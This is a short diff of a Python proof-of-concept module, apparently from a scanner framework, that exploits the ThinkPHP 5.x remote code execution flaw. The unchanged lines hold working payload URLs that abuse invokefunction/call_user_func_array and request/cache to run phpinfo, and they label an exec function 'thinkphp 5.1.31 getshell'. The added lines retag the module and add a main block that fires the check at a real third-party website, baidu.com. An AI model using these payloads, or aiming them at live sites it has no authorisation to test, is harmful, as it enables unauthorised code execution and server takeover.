@@ -22,7 +22,7 @@ def info(data):
     return info
 
 def prove(data):
-    init(data,'web')
+    init(data,'thinkphp')
     if data['base_url']:
         pocs = ["index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
                 "index.php?s=/index/\\think\\request/cache&key=1|phpinfo"]
@@ -51,3 +51,7 @@ def exec(data):
                     data['data'].append({"flag": url})
                     data['res'].append({"info": res.text, "key": "thinkphp 5.1.31 getshell"})
     return data
+
+if __name__=='__main__':
+    from script import init, curl
+    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))
